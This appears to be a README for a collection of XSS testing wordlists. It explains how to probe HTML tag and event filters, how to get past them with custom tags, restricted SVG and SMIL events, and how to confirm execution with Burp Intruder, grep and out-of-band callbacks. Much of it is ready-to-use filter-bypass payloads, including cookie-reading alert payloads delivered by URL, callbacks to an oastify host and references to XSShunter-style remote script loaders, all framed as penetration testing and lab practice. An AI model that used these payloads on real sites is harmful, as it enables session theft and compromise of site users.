### XSS Wordlists

This folder contains reusable wordlists to test HTML-tag blacklists and attribute filters.

- tags-probe.txt: Minimal tag probes like `<body =1>` to trigger blacklist flags.
- events.txt: Event attribute names.
- payloads.txt: Simple JS payloads.
- typo-attrs.txt: Common typo/case variants of event attributes.
- js-autoexec.txt: Elements with auto-executing vectors (onerror/onload/srcdoc/javascript: etc.).
- tags-events-payloads-core.txt: Expanded combinations for high-signal tags, a quick-start list.

New/targeted lists:
- attribute-breakouts.txt: Break out of attribute values and inline handlers (includes `&apos;` decoding case).
- js-string-breakouts.txt: Break out of JS strings; backslash-cancel patterns for escaped quotes.
- template-literal-injection.txt: Minimal `${...}` payloads for template literal contexts.
- angularjs-expressions.txt: AngularJS 1.x expression payloads for DOM-based contexts.
- javascript-url-payloads.txt: `javascript:` URL variations for `href/src` contexts.
- iframe-srcdoc.txt: `srcdoc`-based auto-exec vectors.
- canonical-link-attr.txt: Attribute injection patterns for `<link rel="canonical">` with accesskey/onclick.
 - xsshunter-inspired.txt: High-ROI XSShunter-style payloads (base64-in-attr loaders, jquery getScript, svg onload, input autofocus).

Usage suggestions:
- Start with `tags-probe.txt` to see which tags are blocked.
- If tags pass, try `js-autoexec.txt` for auto-exec contexts.
- Use `tags-events-payloads-core.txt` for broad, interactive coverage.
- Combine `tags-probe.txt` + `events.txt` + `payloads.txt` to generate full lists if needed.
  - For attribute URL contexts, also combine with `javascript-url-payloads.txt`.

Examples:
- `<body =1>`
- `<img src=x onerror=prompt(1)>`
- `<iframe srcdoc="<script>prompt(1)</script>"></iframe>`

Context-to-list mapping quick reference:
- HTML text → `tags-probe.txt`, `tags-events-payloads-core.txt`, `js-autoexec.txt`.
- Attribute value (URL/non-URL) → `attribute-breakouts.txt`; URL: add `javascript-url-payloads.txt`.
- Inline handler code → `attribute-breakouts.txt` (handler variants), or `js-string-breakouts.txt` when quotes escaped.
- JS string → `js-string-breakouts.txt`.
- Template literal → `template-literal-injection.txt`.
- JSON eval/Function → `json-breakouts.txt`.
- SVG-only → `svg-restricted-events.txt`.
- Canonical `<link>` → `canonical-link-attr.txt`.
- Auto-exec without interaction → `js-autoexec.txt`, `iframe-srcdoc.txt`.
 - XSShunter-style loaders → `xsshunter-inspired.txt`.

### Detecting success (Burp Intruder + grep)

Goal: determine if a payload was preserved (not sanitized) and/or executed in the victim context.

Burp Intruder (Grep - Match):
- Add literal/regex matches that indicate preservation or possible exec:
  - `onerror=`, `onload=`, `onresize=`, `onclick=`, `onmouseover=`
  - `javascript:prompt(1)`, `srcdoc="<script>prompt(1)`
  - `<script>prompt(1)`, `<meta http-equiv="refresh" content="0;url=javascript:`
- Prefer case-insensitive regex to catch variations: e.g. `(?i)onerror\s*=`, `(?i)javascript:\s*prompt\(1\)`
- Consider matches for sanitization to triage: `&lt;`, `&gt;`, `&quot;`, `&#x3c;`, `data-sanitized`, `policyblocked`.

Burp Intruder (Grep - Extract):
- Add an extraction around your injection reflection to see exact context:
  - Start after: 40 chars before the insertion point (e.g., `>`)
  - End before: 80 chars after the insertion point (e.g., `<`)
- This helps confirm whether attributes/tags were altered, quoted, or encoded.

Burp Intruder heuristics:
- Response length/status code deltas can signal blocking or WAFs. Sort by length/response code.
- Time-based hints (rare for XSS) can show sinks that delay rendering.

Detecting real execution (client-side DOM):
- Use Burp Collaborator/OAST out-of-band ping to confirm execution without exfiltrating data:
  - Example payload idea (adjust to your OAST domain): `<img src=x onerror=new Image().src='https://YOUR-ID.oastify.com/p'>`
  - For `iframe srcdoc`: `<iframe srcdoc="<script>new Image().src='https://YOUR-ID.oastify.com/p'</script>"></iframe>`
- In Burp, open Collaborator client and watch for interactions during the Intruder run.
- Alternatively, use Burp’s built-in browser to render suspect responses from Intruder/Repeater and observe network panel for the callback.

Rendered-response checks:
- Send interesting Intruder results to Repeater and use “Render” tab.
- Validate whether the tag/attribute is still present in the DOM (right-click → Inspect Element).
- For event-driven payloads, interact (hover/click/focus/resize) to trigger handlers.

CLI grepping of saved responses:
- Save Intruder responses to disk, then grep for preservation signals.
```bash
# Look for preserved event attributes
rg -n --ignore-case 'on(error|load|click|mouseover)\s*=\s*' responses/

# Find javascript: URLs and srcdoc-script vectors
rg -n --ignore-case 'javascript:\s*prompt\(1\)|srcdoc=\"<script>prompt\(1\)' responses/

# Detect common HTML escaping (potentially blocked)
rg -n '&lt;|&gt;|&#x3c;|&#x3e;|&quot;' responses/
```

Notes:
- Preservation in the response is necessary but not sufficient; use OAST or rendering to prove execution.
- CSP may block execution; note `Content-Security-Policy` headers in responses and try event/payload alternatives.
- For non-interactive contexts, prefer auto-exec vectors (`onerror`, `onload`, `srcdoc`, `meta refresh`).

### Custom tags only (built-ins blocked)

When only custom elements are allowed (e.g., `<xss>`), use event handlers on the custom tag. To trigger focus-based handlers without user interaction, combine an element `id` with `tabindex` and a fragment identifier so the browser focuses it on load.

Example payloads (see `custom-tags-only.txt`):
- `<xss onmouseover=prompt(1)>x</xss>`
- `<xss onclick=prompt(1)>x</xss>`
- `<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x</xss>`

How to deliver via URL (fragment focus trick):
- Place the element with `id=x` in the response, then request the page with `#x` so the UA attempts to focus it:
  - `?search=<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x` (URL-encode as needed)
- This technique is demonstrated in the PortSwigger lab “Reflected XSS into HTML context with all tags blocked except custom ones”
  - Reference: [PortSwigger Academy lab](https://0af0006004c110408073036000b9000d.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E%23x%27%3B)

Burp detection tips:
- Add Grep - Match for `id=`, `tabindex=`, `onfocus=` and confirm they aren’t encoded.
- In Render tab, confirm the element exists and is focusable; the fragment should scroll to it. If not, click or tab to trigger.
- If CSP blocks inline handlers, try mouse events (`onmouseover`, `onclick`) or sandboxed `iframe` permutations if allowed.

### SVG-only or restricted SVG events

If HTML tags are blocked but SVG is allowed, test a range of SVG tags and permissible events. Some environments allow only a subset of events (e.g., `onclick`, `onmouseover`, `onbegin`). Use `svg-restricted-events.txt` to probe:

- Auto/indirect execution candidates:
  - `<svg onload=...>`
  - `<image href=x onerror=...>`
  - `<discard onbegin=...>`
  - `<animate ... onbegin=...>` / `<set ... onbegin=...>`
  - `<use href=...>` with data URLs
- Interaction-based fallbacks:
  - Event handlers on geometry elements (`<rect>`, `<circle>`, `<path>`, `<text>`)
  - Pointer events: `onpointerenter`, `onpointerover`, `onclick`
  - Focus with `tabindex` on focusable elements
- Foreign content:
  - `<foreignObject>` can embed HTML; use `iframe srcdoc` if allowed

For additional vectors and browser nuances, see the PortSwigger XSS cheat sheet [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

Triggering SVG discard/SMIL events:
- `discard` fires its `onbegin` when its `begin` time occurs. Use `begin="0s"` for immediate or `begin="indefinite"` and call `element.beginElement()` from an allowed event (e.g., `onclick`). See examples in `svg-restricted-events.txt`.
- SMIL timing model supports event-based begins: `begin="target.click"` fires when element with `id=target` is clicked.
- For environments that disallow `onload`, prefer:
  - Immediate timers: `<animate begin="0s" dur="0.001s" onbegin=...>`
  - User-driven: `begin="indefinite"` and trigger with `beginElement()` via `onclick`/pointer events.
- If focus/keyboard events are allowed, add `tabindex=1` to focusable SVG elements and press a key to trigger `onkeydown/onkeyup` on the `<svg>` root.

Reference for ideas and browser nuances: [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Methodology: XSS hunting under tag/event filtering

1) Identify sink and context
- Is input reflected into HTML, attribute, script, or a JS/URL context? Use Repeater to see raw reflection, then Render/Inspector to see DOM.
- Check response headers for CSP; note inline-event bans and allowed sources.

2) Probe tag filtering
- Run `tags-probe.txt` to learn which tags are rejected vs normalized. Look for:
  - Removed tags (empty reflection)
  - Encoded `&lt;`/`&gt;`
  - Renamed/wrapped nodes
- If only custom tags pass, switch to `custom-tags-only.txt`.

3) Try auto-exec vectors
- Use `js-autoexec.txt` for no-interaction triggers: `onerror`, `onload`, `srcdoc`, `meta refresh`, `javascript:`.
- For SVG-allowed contexts, pivot to `svg-restricted-events.txt` first.

4) Constrain by allowed events
- If only certain events execute, filter payloads accordingly. For SVG, test:
  - Immediate SMIL: `begin="0s"` with `onbegin`/`onend`/`onrepeat` on `animate`, `set`, `animateTransform`, `animateMotion`.
  - Event-based SMIL: `begin="target.click"` or `begin="indefinite"` with `beginElement()` from an allowed handler (e.g., `onclick`).
  - Pointer/mouse: `onpointerenter/over/down/up/move`, `onclick`.
  - Focus/keyboard: `onfocusin/out` (with `tabindex`), `onkeydown/up` on `<svg>`.

5) Interaction testing
- When no auto-exec works, use the built-in browser: hover, click, focus, or keypress.
- For focus, add `tabindex=1` to SVG shapes or the `<svg>` root.

6) Confirm execution
- Use OAST callbacks (e.g., `new Image().src='https://id.oastify.com/p'`) where allowed to avoid visual PoCs.
- Grep for preserved attributes/URLs using the patterns in this README.

7) Encode for delivery
- Intruder often needs URL-encoded vectors. Keep a raw and encoded variant. Example that worked:
  - Raw: `"><svg><animatetransform onbegin=alert(1)>`
  - URL-encoded: `%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

References:
- PortSwigger XSS cheat sheet: [link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
